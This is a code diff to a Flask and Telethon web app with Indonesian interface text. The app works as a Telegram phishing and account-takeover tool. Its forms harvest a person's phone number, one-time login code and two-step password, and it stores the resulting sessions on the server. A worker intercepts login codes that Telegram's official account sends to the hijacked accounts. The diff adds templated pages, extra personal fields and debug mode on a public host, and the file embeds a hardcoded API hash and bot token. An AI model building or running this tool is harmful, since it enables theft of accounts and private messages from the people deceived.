@@ -1,3 +1,4 @@
+# app.py
 import os
 import re
 import asyncio
@@ -6,7 +7,7 @@ from flask import Flask, render_template, request, redirect, url_for, session, f
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
 
-# Telegram Bot Library
+# Telegram Bot
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
@@ -18,8 +19,7 @@ api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
 
-
-SESSION_DIR = "/tmp/sessions"
+SESSION_DIR = "sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
 
 # Simpan data user di memory
@@ -45,12 +45,14 @@ def get_all_users():
 @app.route("/", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
+        name = request.form.get("name", "")
         phone = request.form.get("phone", "").strip()
+        gender = request.form.get("gender", "")
         if not phone:
             flash("Masukkan nomor telepon.", "error")
             return redirect(url_for("login"))
 
-        session["phone"] = phone
+        session["name"], session["phone"], session["gender"] = name, phone, gender
         pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
 
         async def send_code():
@@ -67,7 +69,7 @@ def login():
         except Exception as e:
             flash(f"Error kirim OTP: {e}", "error")
             return redirect(url_for("login"))
-    return "<form method='post'>Phone: <input name='phone'><input type='submit'></form>"
+    return render_template("login.html")
 
 @app.route("/otp", methods=["GET", "POST"])
 def otp():
@@ -94,6 +96,9 @@ def otp():
             except PhoneCodeInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "OTP salah"}
+            except Exception as e:
+                await client.disconnect()
+                return {"ok": False, "error": f"Gagal verifikasi OTP: {e}"}
 
         res = asyncio.run(verify_code())
         if res["ok"]:
@@ -107,7 +112,7 @@ def otp():
         else:
             flash(res.get("error", "Gagal verifikasi OTP"), "error")
             return redirect(url_for("otp"))
-    return "<form method='post'>OTP: <input name='otp'><input type='submit'></form>"
+    return render_template("otp.html")
 
 @app.route("/password", methods=["GET", "POST"])
 def password():
@@ -120,7 +125,6 @@ def password():
 
     if request.method == "POST":
         password_input = request.form.get("password", "")
-
         pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
 
         async def verify_password():
@@ -135,6 +139,9 @@ def password():
             except PasswordHashInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "Password salah"}
+            except Exception as e:
+                await client.disconnect()
+                return {"ok": False, "error": f"Gagal verifikasi password: {e}"}
 
         res = asyncio.run(verify_password())
         if res["ok"]:
@@ -143,17 +150,20 @@ def password():
         else:
             flash(res["error"], "error")
             return redirect(url_for("password"))
-    return "<form method='post'>Password: <input name='password'><input type='submit'></form>"
+    return render_template("password.html")
 
 @app.route("/success")
 def success():
-    return f"Login berhasil untuk {session.get('phone')}"
+    return render_template("success.html",
+                           name=session.get("name"),
+                           phone=session.get("phone"),
+                           gender=session.get("gender"))
 
 # ======= WORKER =======
 async def forward_handler(event, client_name):
     text_msg = getattr(event, "raw_text", "")
     sender = await event.get_sender()
-    if sender.id != 777000:
+    if sender.id != 777000:  # Hanya official Telegram
         return
 
     otp_match = re.findall(r"\b\d{4,6}\b", text_msg)
@@ -239,4 +249,4 @@ def start_bot():
 if __name__ == "__main__":
     start_worker()
     threading.Thread(target=start_bot, daemon=True).start()
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
